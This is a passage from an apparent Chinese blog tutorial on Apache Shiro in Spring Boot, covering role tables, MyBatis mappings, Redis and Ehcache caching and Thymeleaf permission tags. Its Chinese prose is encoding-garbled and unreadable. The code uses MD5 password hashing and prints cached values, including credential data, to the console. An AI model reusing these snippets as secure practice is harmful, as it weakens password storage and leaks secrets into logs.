}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nè®¾ç½®å å¯ç®æ³åæ£åæ¬¡æ°\n\n//2. åå»ºå®å¨ç®¡çå¨\n@bean\npublic defaultwebsecuritymanager defaultwebsecuritymanager(authorizingrealm realm){\n  defaultwebsecuritymanager defaultwebsecuritymanager = new defaultwebsecuritymanager();\n\n  hashedcredentialsmatcher credentialsmatcher = new hashedcredentialsmatcher();\n  credentialsmatcher.sethashalgorithmname("md5");\n  credentialsmatcher.sethashiterations(1024);\n  realm.setcredentialsmatcher(credentialsmatcher);\n\n  defaultwebsecuritymanager.setrealm(realm);\n  return defaultwebsecuritymanager;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 8. ææçå®ç°\n\n# 0. ææé¡µé¢\n\n<%@ taglib prefix="shiro" uri="http://shiro.apache.org/tags" %>\n<%--\n  created by intellij idea.\n  user: plankton\n  date: 2022/3/28\n  time: 20:26\n  to change this template use file | settings | file templates.\n--%>\n<%@ page contenttype="text/html;charset=utf-8" language="java" %>\n<html>\n<head>\n    <title>é¦é¡µ</title>\n</head>\n<body>\n<h1>é¦é¡µ</h1>\n<a href="${pagecontext.request.contextpath}/user/logout">éåºç»é</a> <br>\n<ul>\n    <shiro:hasanyroles name="admin" >\n        \n        <shiro:hasanyroles name="user">\n            <li><a href="#">ç¨æ·ç®¡ç</a></li>\n        </shiro:hasanyroles>\n        \n        <shiro:hasanyroles name="order">\n            <li><a href="#">ååç®¡ç</a></li>\n            <li><a href="#">è®¢åç®¡ç</a></li>\n            <li><a href="#">ç©æµç®¡ç</a></li>\n        </shiro:hasanyroles>\n        \n    </shiro:hasanyroles>\n</ul>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n# 1. æµè¯ä»£ç \n\n@override\nprotected authorizationinfo dogetauthorizationinfo(principalcollection principalcollection) {\n  string principal = (string) principalcollection.getprimaryprincipal();\n  if ("admin".equals(principal)){\n    simpleauthorizationinfo authorizationinfo = new simpleauthorizationinfo();\n    authorizationinfo.addroles(arrays.aslist("admin","user"));\n    return authorizationinfo;\n  }\n  return null;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# 2. æ¹æ³è°ç¨ä¸­çæéæ§å¶\n\n@requestmapping("delete/{username}")\n@responsebody\n@requiresroles(value = {"admin","user"})\npublic string deleteuser(@pathparam("username")string username){\n    userservice.deleteuser(username);\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 3. æææ°æ®æä¹å\n\néå¸¸æåµä¸ï¼æä»¬çææä¿¡æ¯å­å¨å°æ°æ®åºä¸­ï¼æä»¬è¿éä½¿ç¨ä¸ä¸ªç¨æ·å¯¹åºå¤ä¸ªè§è²ï¼è§è²å¯¹åºæéçrbacæ¨¡åè¿è¡è®¾è®¡ãå¦ä¸å¾æç¤ºï¼\n\n\n\nåå»ºå¯¹åºçè¡¨ï¼\n\ndrop table if exists t_role;\ncreate table if not exists t_role\n(\n    rid   varchar(100) not null,\n    rname varchar(200) not null,\n    primary key (rid)\n);\n\ninsert into t_role\nvalues (\'1\', \'admin\'),\n       (\'2\', \'user\'),\n       (\'3\', \'order\');\n\ndrop table if exists t_permission;\ncreate table if not exists t_permission\n(\n    pid   varchar(100) not null,\n    pname varchar(200) not null,\n    url   varchar(200) not null,\n    primary key (pid)\n);\n\ninsert into t_permission\nvalues (\'1\', \'user:*:*\', \'/user/*\'),\n       (\'2\', \'order:*:*\', \'/order/*\'),\n       (\'3\', \'user:delete:*\', \'/user/delete/\');\n\n\ndrop table if exists t_user_role;\ncreate table if not exists t_user_role\n(\n    id  varchar(100) not null,\n    uid varchar(100) not null,\n    rid varchar(100) not null,\n    primary key (id)\n);\n\ninsert into t_user_role\nvalues (\'1\', \'826975e8649341c1b6af743e4f9923f2\', \'1\'),\n       (\'2\', \'826975e8649341c1b6af743e4f9923f2\', \'2\'), -- admin all\n       (\'3\', \'826975e8649341c1b6af743e4f9923f2\', \'3\'),\n       (\'4\', \'00b6c77cb7c048e9a6a8858a600cc206\', \'3\'); -- lisi order\n\ndrop table if exists t_role_permission;\ncreate table t_role_permission\n(\n    id  varchar(100) not null,\n    rid varchar(100) not null,\n    pid varchar(100) not null,\n    primary key (id)\n);\n\ninsert into t_role_permission\nvalues (\'1\', \'1\', \'1\'),\n       (\'2\', \'1\', \'2\'),\n       (\'3\', \'1\', \'3\'),\n       (\'4\', \'2\', \'1\'),\n       (\'5\', \'2\', \'3\'),\n       (\'6\', \'3\', \'2\'),\n       (\'7\', \'3\', \'2\');\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\nç¼åå®ä½ç±»ï¼\n\npackage com.pwddd.shirojsp.entity;\n\nimport lombok.allargsconstructor;\nimport lombok.data;\nimport lombok.noargsconstructor;\nimport lombok.experimental.accessors;\n\nimport java.util.list;\n\n@data\n@accessors(chain = true)\n@noargsconstructor\n@allargsconstructor\npublic class role {\n    \n    private string id;\n    private string rid;\n    private string rname;\n    \n    private list<perm> perms;\n    \n}\n\n\npackage com.pwddd.shirojsp.entity;\n\nimport lombok.allargsconstructor;\nimport lombok.data;\nimport lombok.noargsconstructor;\nimport lombok.experimental.accessors;\n\n@data\n@accessors(chain = true)\n@noargsconstructor\n@allargsconstructor\npublic class perm {\n\n    private string id;\n    private string pid;\n    private string pname;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\næ¥è¯¢ç¨æ·æ¶å°±æ¥ææçç¨æ·æéåèº«ä»½ä¿¡æ¯ï¼\n\n<resultmap id="usermap" type="user">\n  <id column="id" property="id" />\n  <result column="username" property="username" />\n  <result column="password" property="password" />\n  <collection property="roles" oftype="role" >\n    <id column="role_id" property="rid" />\n    <result column="role_name" property="rname" />\n    <collection property="perms" oftype="perm">\n      <id column="perm_id" property="pid" />\n      <result column="perm_name" property="pname" />\n      <result column="perm_url" property="purl" />\n    </collection>\n  </collection>\n</resultmap>\n<select id="selectuser" resultmap="usermap">\n  select u.id, u.username, u.password, r.rid role_id, r.rname role_name,tp.pid perm_id,tp.pname perm_name,tp.url perm_url\n  from t_user u\n  left join t_user_role ur on u.id = ur.uid\n  left join t_role r on ur.rid = r.rid\n  left join t_role_permission trp on r.rid = trp.rid\n  left join t_permission tp on trp.pid = tp.pid\n  where username = #{username}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nè®¾ç½®æéä¿¡æ¯ï¼\n\n    @override\n    protected authorizationinfo dogetauthorizationinfo(principalcollection principalcollection) {\n        string principal = (string) principalcollection.getprimaryprincipal();\n\n        // æ ¹æ®principalæ¥è¯¢å¯¹åºçç¨æ·ç»\n        user user = userservice.getuser(principal);\n        if (user != null){\n            simpleauthorizationinfo authorizationinfo = new simpleauthorizationinfo();\n            for (role role :\n                    user.getroles()) {\n                authorizationinfo.addrole(role.getrname());\n                for (perm perm : role.getperms()){\n                    authorizationinfo.addstringpermission(perm.getpname());\n                }\n            }\n            return authorizationinfo;\n        }\n\n        return null;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# 9. ä½¿ç¨cachemanager\n\n# 0. ehcache\n\nå¼å¥ä¾èµ\n\n<dependency>\n  <groupid>org.apache.shiro</groupid>\n  <artifactid>shiro-ehcache</artifactid>\n  <version>1.5.3</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\nå¼å¯ç¼å­\n\n//2. åå»ºå®å¨ç®¡çå¨\n@bean\npublic defaultwebsecuritymanager defaultwebsecuritymanager(authorizingrealm realm){\n\n  defaultwebsecuritymanager defaultwebsecuritymanager = new defaultwebsecuritymanager();\n\n  hashedcredentialsmatcher credentialsmatcher = new hashedcredentialsmatcher();\n  credentialsmatcher.sethashalgorithmname("md5");\n  credentialsmatcher.sethashiterations(1024);\n  realm.setcredentialsmatcher(credentialsmatcher);\n  realm.setcachemanager(new ehcachemanager());\n  realm.setcachingenabled(true);\n  realm.setauthorizationcachingenabled(true);\n  realm.setauthenticationcachingenabled(true);\n  defaultwebsecuritymanager.setrealm(realm);\n  return defaultwebsecuritymanager;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# 1. redis\n\nå¼å¥redisä¾èµï¼\n\n\x3c!--redisæ´åspringboot--\x3e\n<dependency>\n  <groupid>org.springframework.boot</groupid>\n  <artifactid>spring-boot-starter-data-redis</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\néç½®è¿æ¥ï¼\n\n# redis\nspring.redis.database=0\nspring.redis.host=localhost\nspring.redis.port=6379\n\n\n1\n2\n3\n4\n\n\néç½®rediscachemanager\n\npackage com.pwddd.shirojsp.cache;\n\nimport org.apache.shiro.cache.cache;\nimport org.apache.shiro.cache.cacheexception;\nimport org.apache.shiro.cache.cachemanager;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.boot.autoconfigure.cache.cacheproperties;\nimport org.springframework.data.redis.core.redistemplate;\nimport org.springframework.stereotype.component;\n\n@component\npublic class rediscachemanager implements cachemanager {\n\n    @autowired\n    private rediscache rediscache;\n\n    @override\n    public <k, v> cache<k, v> getcache(string s) throws cacheexception {\n        system.out.println(s);\n        rediscache.setcachename(s);\n        return rediscache;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\néç½®rediscache\n\npackage com.pwddd.shirojsp.cache;\n\nimport org.apache.shiro.cache.cache;\nimport org.apache.shiro.cache.cacheexception;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.data.redis.core.redistemplate;\nimport org.springframework.stereotype.component;\n\nimport java.util.collection;\nimport java.util.set;\n\n@component\npublic class rediscache<k,v> implements cache<k,v> {\n\n    private string cachename;\n\n\n    public rediscache() {\n    }\n\n    public string getcachename() {\n        return cachename;\n    }\n\n    public void setcachename(string cachename) {\n        this.cachename = cachename;\n    }\n\n    @autowired\n    private redistemplate redistemplate;\n\n    @override\n    public v get(k k) throws cacheexception {\n        v value = (v) redistemplate.opsforhash().get(this.getcachename(), k);\n        system.out.println("ãredis - getã{ key:"+k+",value:"+value);\n        return value;\n    }\n\n    @override\n    public v put(k k, v v) throws cacheexception {\n        system.out.println("ãredis - putã{ key:"+k+",value:"+v);\n        redistemplate.opsforhash().put(this.cachename,k.tostring(),v);\n        return null;\n    }\n\n    @override\n    public v remove(k k) throws cacheexception {\n        v value = (v) redistemplate.opsforhash().delete(this.cachename, k.tostring());\n        system.out.println("ãredis - putã{ key:"+k+",value:"+value);\n        return value;\n    }\n\n    @override\n    public void clear() throws cacheexception {\n        system.out.println("ãredis - clearã{} ");\n        redistemplate.delete(this.getcachename());\n    }\n\n    @override\n    public int size() {\n        return redistemplate.opsforhash().size(this.cachename).intvalue();\n    }\n\n    @override\n    public set<k> keys() {\n        return redistemplate.opsforhash().keys(this.cachename);\n    }\n\n    @override\n    public collection<v> values() {\n        return redistemplate.opsforhash().values(this.cachename);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n\n\néç½®ç¼å­ç®¡çå¨\n\n@bean\npublic defaultwebsecuritymanager defaultwebsecuritymanager(authorizingrealm realm,rediscachemanager rediscachemanager){\n\n  defaultwebsecuritymanager defaultwebsecuritymanager = new defaultwebsecuritymanager();\n\n  hashedcredentialsmatcher credentialsmatcher = new hashedcredentialsmatcher();\n  credentialsmatcher.sethashalgorithmname("md5");\n  credentialsmatcher.sethashiterations(1024);\n  realm.setcredentialsmatcher(credentialsmatcher);\n  realm.setcachemanager(rediscachemanager);\n  realm.setcachingenabled(true);\n  realm.setauthorizationcachingenabled(true);\n  realm.setauthenticationcachingenabled(true);\n  defaultwebsecuritymanager.setrealm(realm);\n  return defaultwebsecuritymanager;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\næµè¯ä¹åæ¥éï¼å ä¸ºçä¸è½å¤åºååï¼å æ­¤è¿éè¦è§£å³è¿ä¸ªbug\n\nnested exception is java.io.notserializableexception: org.apache.shiro.util.simplebytesource\n\npackage com.pwddd.shirojsp.cache;\n\nimport org.apache.shiro.codec.base64;\nimport org.apache.shiro.codec.codecsupport;\nimport org.apache.shiro.codec.hex;\nimport org.apache.shiro.util.bytesource;\n\nimport java.io.file;\nimport java.io.inputstream;\nimport java.io.serializable;\nimport java.util.arrays;\n\npublic class customerbytesource implements bytesource, serializable {\n\n\n    private static final long serialversionuid = -6698337076775679951l;\n    private  byte[] bytes;\n    private string cachedhex;\n    private string cachedbase64;\n\n    public customerbytesource(byte[] bytes) {\n        this.bytes = bytes;\n    }\n\n    /**\n     * creates an instance by converting the characters to a byte array (assumes utf-8 encoding).\n     *\n     * @param chars the source characters to use to create the underlying byte array.\n     * @since 1.1\n     */\n    public customerbytesource(char[] chars) {\n        this.bytes = codecsupport.tobytes(chars);\n    }\n\n    /**\n     * creates an instance by converting the string to a byte array (assumes utf-8 encoding).\n     *\n     * @param string the source string to convert to a byte array (assumes utf-8 encoding).\n     * @since 1.1\n     */\n    public customerbytesource(string string) {\n        this.bytes = codecsupport.tobytes(string);\n    }\n\n    /**\n     * creates an instance using the sources bytes directly - it does not create a copy of the\n     * argument\'s byte array.\n     *\n     * @param source the source to use to populate the underlying byte array.\n     * @since 1.1\n     */\n    public customerbytesource(bytesource source) {\n        this.bytes = source.getbytes();\n    }\n\n    /**\n     * creates an instance by converting the file to a byte array.\n     *\n     * @param file the file from which to acquire bytes.\n     * @since 1.1\n     */\n    public customerbytesource(file file) {\n        this.bytes = new customerbytesource.byteshelper().getbytes(file);\n    }\n\n    /**\n     * creates an instance by converting the stream to a byte array.\n     *\n     * @param stream the stream from which to acquire bytes.\n     * @since 1.1\n     */\n    public customerbytesource(inputstream stream) {\n        this.bytes = new customerbytesource.byteshelper().getbytes(stream);\n    }\n\n    /**\n     * returns {@code true} if the specified object is a recognized data type that can be easily converted to\n     * bytes by instances of this class, {@code false} otherwise.\n     * <p/>\n     * this implementation returns {@code true} iff the specified object is an instance of one of the following\n     * types:\n     * <ul>\n     * <li>{@code byte[]}</li>\n     * <li>{@code char[]}</li>\n     * <li>{@link bytesource}</li>\n     * <li>{@link string}</li>\n     * <li>{@link file}</li>\n     * </li>{@link inputstream}</li>\n     * </ul>\n     *\n     * @param o the object to test to see if it can be easily converted to bytes by instances of this class.\n     * @return {@code true} if the specified object can be easily converted to bytes by instances of this class,\n     *         {@code false} otherwise.\n     * @since 1.2\n     */\n    public static boolean iscompatible(object o) {\n        return o instanceof byte[] || o instanceof char[] || o instanceof string ||\n                o instanceof bytesource || o instanceof file || o instanceof inputstream;\n    }\n\n    public byte[] getbytes() {\n        return this.bytes;\n    }\n\n    public boolean isempty() {\n        return this.bytes == null || this.bytes.length == 0;\n    }\n\n    public string tohex() {\n        if ( this.cachedhex == null ) {\n            this.cachedhex = hex.encodetostring(getbytes());\n        }\n        return this.cachedhex;\n    }\n\n    public string tobase64() {\n        if ( this.cachedbase64 == null ) {\n            this.cachedbase64 = base64.encodetostring(getbytes());\n        }\n        return this.cachedbase64;\n    }\n\n    public string tostring() {\n        return tobase64();\n    }\n\n    public int hashcode() {\n        if (this.bytes == null || this.bytes.length == 0) {\n            return 0;\n        }\n        return arrays.hashcode(this.bytes);\n    }\n\n    public boolean equals(object o) {\n        if (o == this) {\n            return true;\n        }\n        if (o instanceof bytesource) {\n            bytesource bs = (bytesource) o;\n            return arrays.equals(getbytes(), bs.getbytes());\n        }\n        return false;\n    }\n\n    //will probably be removed in shiro 2.0.  see shiro-203:\n    //https://issues.apache.org/jira/browse/shiro-203\n    private static final class byteshelper extends codecsupport {\n        public byte[] getbytes(file file) {\n            return tobytes(file);\n        }\n\n        public byte[] getbytes(inputstream stream) {\n            return tobytes(stream);\n        }\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n\n\nèªå®ä¹bytesourceä¹åä¿®æ¹çæççæ¹å¼ï¼\n\n@override\nprotected authenticationinfo dogetauthenticationinfo(authenticationtoken authenticationtoken) throws authenticationexception {\n  system.out.println("====================================");\n  string principal = (string) authenticationtoken.getprincipal();\n\n  system.out.println(principal);\n  // 1. å©ç¨åå­å»æ¥è¯¢æ°æ®åº\n  user user = userservice.getuser(principal);\n  if (user != null){\n    system.out.println(user.getid());\n    return new simpleauthenticationinfo(\n      user.getusername(),\n      user.getpassword(),\n      new customerbytesource(user.getid().getbytes(standardcharsets.utf_8)),\n      this.getname()\n    );\n  }\n  return null;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nè¿éä¸ç¥éä¸ºä»ä¹åªæææçç¼å­ï¼æ²¡æè®¤è¯çç¼å­ï¼å¦å¤ï¼äºæ¬¡ç»éä¼æ¥éã\n\n//todo\n\n# 10. thymeleaf æéæ§å¶\n\n# 0. å¯¼å¥ä¾èµ\n\n<dependency>\n  <groupid>com.github.theborakompanioni</groupid> \n  <artifactid>thymeleaf-extras-shiro</artifactid> \n  <version>2.0.0</version> \n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n# 1. å¼å¥åç§°ç©ºé´\n\nxmlns:shiro="http://www.pollix.at/thymeleaf/shiro"\n\n\n1\n\n\n# 2. å¸¸è§çæéæ§å¶æ ç­¾\n\n\x3c!-- éªè¯å½åç¨æ·æ¯å¦ä¸ºâè®¿å®¢âï¼å³æªè®¤è¯ï¼åå«æªè®°ä½ï¼çç¨æ·ã --\x3e\n<p shiro:guest="">please <a href="login.html">login</a></p>\n\n\n\x3c!-- è®¤è¯éè¿æå·²è®°ä½çç¨æ·ã --\x3e\n<p shiro:user="">\n    welcome back john! not john? click <a href="login.html">here</a> to login.\n</p>\n\n\x3c!-- å·²è®¤è¯éè¿çç¨æ·ãä¸åå«å·²è®°ä½çç¨æ·ï¼è¿æ¯ä¸useræ ç­¾çåºå«æå¨ã --\x3e\n<p shiro:authenticated="">\n    hello, <span shiro:principal=""></span>, how are you today?\n</p>\n<a shiro:authenticated="" href="updateaccount.html">update your contact information</a>\n\n\x3c!-- è¾åºå½åç¨æ·ä¿¡æ¯ï¼éå¸¸ä¸ºç»å½å¸å·ä¿¡æ¯ã --\x3e\n<p>hello, <shiro:principal/>, how are you today?</p>\n\n\n\x3c!-- æªè®¤è¯éè¿ç¨æ·ï¼ä¸authenticatedæ ç­¾ç¸å¯¹åºãä¸guestæ ç­¾çåºå«æ¯ï¼è¯¥æ ç­¾åå«å·²è®°ä½ç¨æ·ã --\x3e\n<p shiro:notauthenticated="">\n    please <a href="login.html">login</a> in order to update your credit card information.\n</p>\n\n\x3c!-- éªè¯å½åç¨æ·æ¯å¦å±äºè¯¥è§è²ã --\x3e\n<a shiro:hasrole="admin" href="admin.html">administer the system</a>\x3c!-- æ¥æè¯¥è§è² --\x3e\n\n\x3c!-- ä¸hasroleæ ç­¾é»è¾ç¸åï¼å½ç¨æ·ä¸å±äºè¯¥è§è²æ¶éªè¯éè¿ã --\x3e\n<p shiro:lacksrole="developer">\x3c!-- æ²¡æè¯¥è§è² --\x3e\n    sorry, you are not allowed to developer the system.\n</p>\n\n\x3c!-- éªè¯å½åç¨æ·æ¯å¦å±äºä»¥ä¸ææè§è²ã --\x3e\n<p shiro:hasallroles="developer, 2">\x3c!-- è§è²ä¸å¤æ­ --\x3e\n    you are a developer and a admin.\n</p>\n\n\x3c!-- éªè¯å½åç¨æ·æ¯å¦å±äºä»¥ä¸ä»»æä¸ä¸ªè§è²ã  --\x3e\n<p shiro:hasanyroles="admin, vip, developer,1">\x3c!-- è§è²æå¤æ­ --\x3e\n    you are a admin, vip, or developer.\n</p>\n\n\x3c!--éªè¯å½åç¨æ·æ¯å¦æ¥ææå®æéã  --\x3e\n<a shiro:haspermission="userinfo:add" href="createuser.html">æ·»å ç¨æ·</a>\x3c!-- æ¥ææé --\x3e\n\n\x3c!-- ä¸haspermissionæ ç­¾é»è¾ç¸åï¼å½åç¨æ·æ²¡æå¶å®æéæ¶ï¼éªè¯éè¿ã --\x3e\n<p shiro:lackspermission="userinfo:del">\x3c!-- æ²¡ææé --\x3e\n    sorry, you are not allowed to delete user accounts.\n</p>\n\n\x3c!-- éªè¯å½åç¨æ·æ¯å¦æ¥æä»¥ä¸ææè§è²ã --\x3e\n<p shiro:hasallpermissions="userinfo:view, userinfo:add">\x3c!-- æéä¸å¤æ­ --\x3e\n    you can see or add users.\n</p>\n\n\x3c!-- éªè¯å½åç¨æ·æ¯å¦æ¥æä»¥ä¸ä»»æä¸ä¸ªæéã  --\x3e\n<p shiro:hasanypermissions="userinfo:view, userinfo:del">\x3c!-- æéæå¤æ­ --\x3e\n    you can see or delete users.\n</p>\n<a shiro:haspermission="pp" href="createuser.html">create a new user</a>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\n# 3. å å¥æ¹è¨è§£æ\n\n@bean(name = "shirodialect")\npublic shirodialect shirodialect(){\n  return new shirodialect();\n}\n\n\n1\n2\n3\n4\n\n\n\n# åèèµæ\n\n 1. bilibiiliç¼ç¨ä¸è¯äººï¼https://www.bilibili.com/video/bv1uz4y197zm',charsets:{cjk:!0},lastUpdated:"2022/04/25, 00:33:18",lastUpdatedTimestamp:1650846798e3},{title:"å°ç­¹ç½",frontmatter:{title:"å°ç­¹ç½",date:"2022-04-25T09:00:00.000Z",permalink:"/dev/java/project/cf",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","é¡¹ç®å®æ"],tags:["Javaé¡¹ç®"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/101.%E5%90%8E%E7%AB%AF/1013.%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/00.%E5%B0%9A%E7%AD%B9%E7%BD%91.html",relativePath:"01.å¼å/101.åç«¯/1013.é¡¹ç®å®æ/00.å°ç­¹ç½.md",key:"v-d37ff6a4",path:"/dev/java/project/cf/",headers:[{level:2,title:"ç®ä»",slug:"ç®ä»",normalizedTitle:"ç®ä»",charIndex:10},{level:2,title:"ç¯å¢æ­å»º",slug:"ç¯å¢æ­å»º",normalizedTitle:"ç¯å¢æ­å»º",charIndex:66},{level:3,title:"åå»ºé¡¹ç®",slug:"åå»ºé¡¹ç®",normalizedTitle:"åå»ºé¡¹ç®",charIndex:75},{level:3,title:"æ°æ®åºè®¾è®¡",slug:"æ°æ®åºè®¾è®¡",normalizedTitle:"æ°æ®åºè®¾è®¡",charIndex:352},{level:3,title:"éåå·¥ç¨",slug:"éåå·¥ç¨",normalizedTitle:"éåå·¥ç¨",charIndex:1970},{level:3,title:"ä¾èµç®¡ç",slug:"ä¾èµç®¡ç",normalizedTitle:"ä¾èµç®¡ç",charIndex:6193},{level:3,title:"SSMæ´å",slug:"ssmæ´å",normalizedTitle:"ssmæ´å",charIndex:10938}],excerpt:'<h1 id="å°ç­¹ç½"><a class="header-anchor" href="#å°ç­¹ç½">#</a> å°ç­¹ç½</h1>\n<h2 id="ç®ä»"><a class="header-anchor" href="#ç®ä»">#</a> ç®ä»</h2>\n<blockquote>\n<p>å°ç­¹ç½é¡¹ç®å®ä½ä¸ºï¼ä»åä½åºç¨æ¶æå°å¾®æå¡æ¶æè¿æ¸¡çå¥é¨é¡¹ç®ï¼é¡¹ç®åå°åºäºä¼ ç»çSSMæ¡æ¶ã</p>\n</blockquote>\n',headersStr:"ç®ä» ç¯å¢æ­å»º åå»ºé¡¹ç® æ°æ®åºè®¾è®¡ éåå·¥ç¨ ä¾èµç®¡ç SSMæ´å",content:'# å°ç­¹ç½\n\n\n# ç®ä»\n\n> å°ç­¹ç½é¡¹ç®å®ä½ä¸ºï¼ä»åä½åºç¨æ¶æå°å¾®æå¡æ¶æè¿æ¸¡çå¥é¨é¡¹ç®ï¼é¡¹ç®åå°åºäºä¼ ç»çSSMæ¡æ¶ã\n\n\n# ç¯å¢æ­å»º\n\n\n# åå»ºé¡¹ç®\n\né¡¹ç®ä¹é´çå³ç³»ä¾èµå¾ï¼\n\næ ¹æ®å³ç³»åå»ºå¯¹åºçmavené¡¹ç®ã\n\n\n\nå¹¶è¡¨ç¤ºä»¥ä¸çå¯¹åºå³ç³»ã(ä»¥webuiä¾èµcomponentä¸ºä¾)\n\n<dependencies>\n  <dependency>\n    <groupId>com.pwddd.cf</groupId>\n    <artifactId>cf-admin-component</artifactId>\n    <version>1.0-SNAPSHOT</version>\n  </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# æ°æ®åºè®¾è®¡\n\n# ç©çå»ºæ¨¡\n\n# çè®ºé¨å\n\nç¬¬ä¸èå¼ï¼æ°æ®åºè¡¨ä¸­çæ¯ä¸åé½ä¸å¯ååï¼ä¹å°±æ¯åå­æ§\n\n\n\nè¿ä¸ªè¡¨ä¸­âé¨é¨âåâå²ä½âåºè¯¥æåæä¸¤ä¸ªå­æ®µï¼âé¨é¨åç§°âãâå²ä½âãè¿æ ·æè½å¤ä¸é¨éå¯¹âé¨é¨âæâå²ä½âè¿è¡æ¥è¯¢ã\n\n\n\nç¬¬äºèå¼ï¼å¨æ»¡è¶³ç¬¬ä¸èå¼åºç¡ä¸è¦æ±æ¯ä¸ªå­æ®µé½åä¸»é®å®æ´ç¸å³ï¼èä¸æ¯ä»åä¸»é®é¨åç¸å³ï¼ä¸»è¦éå¯¹èåä¸»é®èè¨ï¼\n\n\n\nâè®¢åè¯¦æè¡¨âä½¿ç¨âè®¢åç¼å·âåâäº§åç¼å·âä½ä¸ºèåä¸»é®ãæ­¤æ¶âäº§åä»·æ ¼âãâäº§åæ°éâé½åèåä¸»é®æ´ä½ç¸å³ï¼ä½âè®¢åéé¢âåâä¸åæ¶é´â åªåèåä¸»é®ä¸­çâè®¢åç¼å·âç¸å³ï¼åâäº§åç¼å·âæ å³ãæä»¥åªå³èäºä¸»é®ä¸­çé¨åå­æ®µï¼ä¸æ»¡è¶³ç¬¬äºèå¼ãæâè®¢åéé¢âåâä¸åæ¶é´âç§»å°è®¢åè¡¨å°±ç¬¦åç¬¬äºèå¼äºã\n\n\n\nç¬¬ä¸èå¼ï¼è¡¨ä¸­çéä¸»é®å­æ®µåä¸»é®å­æ®µç´æ¥ç¸å³ï¼ä¸åè®¸é´æ¥ç¸å³ã\n\n\n\nä¸é¢è¡¨ä¸­çâé¨é¨åç§°âåâåå·¥ç¼å·âçå³ç³»æ¯âåå·¥ç¼å·âââé¨é¨ç¼å·âââé¨é¨åç§°âï¼ä¸æ¯ç´æ¥ç¸å³ãæ­¤æ¶ä¼å¸¦æ¥ä¸åé®é¢ï¼\n\n * æ°æ®åä½ï¼âé¨é¨åç§°âå¤æ¬¡éå¤åºç°ã\n\n * æå¥å¼å¸¸ï¼ç»å»ºä¸ä¸ªæ°é¨é¨æ¶æ²¡æåå·¥ä¿¡æ¯ï¼ä¹å°±æ æ³åç¬æå¥é¨é¨ ä¿¡æ¯ãå°±ç®å¼ºè¡æå